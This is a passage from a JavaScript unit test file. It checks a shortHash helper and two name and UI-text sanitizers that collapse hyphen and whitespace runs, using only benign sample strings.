		it("lowercases and truncates without padding", () => {
			expect(shortHash("ABCDEF0123456789", 4)).toBe("abcd");
			expect(shortHash("ABC", 12)).toBe("abc");
			expect(shortHash("abcdef", 3.9)).toBe("abc");
		});

		it("returns empty for zero or negative lengths", () => {
			expect(shortHash("abcdef", 0)).toBe("");
			expect(shortHash("abcdefghij", -5)).toBe("");
		});
	});
}

describe("security: survivor kills", () => {
	it("collapses hyphen runs and trims edge hyphens in sanitizeName", () => {
		expect(sanitizeName("a--b")).toBe("a-b");
		expect(sanitizeName("-a-")).toBe("a");
		expect(sanitizeName("--a--b--")).toBe("a-b");
	});

	it("collapses interior whitespace runs in sanitizeUiText", () => {
		expect(sanitizeUiText("a  \t b")).toBe("a b");
	});
});
